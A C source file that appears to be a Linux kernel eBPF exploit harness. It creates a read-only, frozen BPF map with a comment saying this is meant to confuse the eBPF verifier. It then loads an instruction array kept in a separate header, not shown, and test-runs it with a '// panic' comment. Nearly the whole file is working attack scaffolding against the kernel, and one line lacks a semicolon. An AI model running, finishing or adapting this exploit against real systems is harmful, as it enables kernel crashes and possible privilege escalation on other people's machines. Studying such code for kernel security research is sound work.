#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <syscall.h>

#include "bpf_program.h"

#include <linux/rtnetlink.h>
#include <linux/if.h>
#define PAGESZ 0x1000
#define ARR_MAP_SIZE 0x1000
#define VERIFIER_LOG_SZ 0x20 * PAGESZ

char* verifier_log;


static void hexDump(const void *data, size_t size)
{
    char ascii[17];
    uint64_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }

                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void log_err(const char *format, ...) {
    if (!format) {
        exit(EXIT_FAILURE);
    }

    fprintf(stderr, "%s", "[-] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "\n");
    fflush(stderr);

    exit(EXIT_FAILURE);
}

#define SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) log_err("[-] %s:%d: returned %p", __FILE__, __LINE__, _r); \
    _r; \
});

#define PROG_SAFE(result) \
({ \
    typeof(result) _r = (result); \
    if (_r < 0) {print_log(); log_err("[-] %s:%d: returned %p", __FILE__, __LINE__, _r); }\
    _r; \
});


int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
  return syscall(SYS_bpf, cmd, attr, size);
}

void debug() {
	printf("Debug\n");
    getchar();
}

void print_log() {
  printf("=========================================\n%s\n=========================================\n", verifier_log);
}

int main() {
  verifier_log = (char*)SAFE(mmap(NULL, VERIFIER_LOG_SZ, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0));

  union bpf_attr map = {
    .map_type = BPF_MAP_TYPE_ARRAY,
    .key_size = 4,
    .value_size = 8,
    .max_entries = 1,
    .map_flags = BPF_F_RDONLY_PROG
  };

  // create map
  int map_fd = SAFE(bpf(BPF_MAP_CREATE, &map, sizeof(map)));

  int key = 0;
  uint64_t value = 0; // used confuse ebpf verifier
  union bpf_attr update = {
    .map_fd = map_fd,
    .key = &key,
    .value = &value,
    .flags = 0
  };
  // update the map with smth
  SAFE(bpf(BPF_MAP_UPDATE_ELEM, &update, sizeof(update)));

  union bpf_attr freeze = {
    .map_fd = map_fd
  };
  // freeze the map
  SAFE(bpf(BPF_MAP_FREEZE, &freeze, sizeof(update)));

  int instrs_cnt = sizeof(instrs) / 8;
  printf("count: %d/%d = %d\n", sizeof(instrs), 8, instrs_cnt);

  union bpf_attr prog = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = instrs_cnt,
    .insns = instrs,
    .license = "",
    .log_level = 2,
    .log_buf = (long long unsigned int)verifier_log,
    .log_size = VERIFIER_LOG_SZ,
  };

  int prog_fd = PROG_SAFE(bpf(BPF_PROG_LOAD, &prog, sizeof(prog)));
  // print_log();

  char* data_in = (char*)SAFE(mmap((void*)0xdeadbeee000, PAGESZ * 2, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0))
  char* data_out = data_in + PAGESZ;

  memset(data_in, 0x41, 0x1000);

  union bpf_attr run = {
    .test.data_in = data_in,
    .test.data_size_in = 0x400,
    
    .test.data_out = data_out,
    .test.data_size_out = 0x400,
    .test.prog_fd = prog_fd,
  };

  SAFE(bpf(BPF_PROG_TEST_RUN, &run, sizeof(run))); // panic

  debug();
  return 0;
}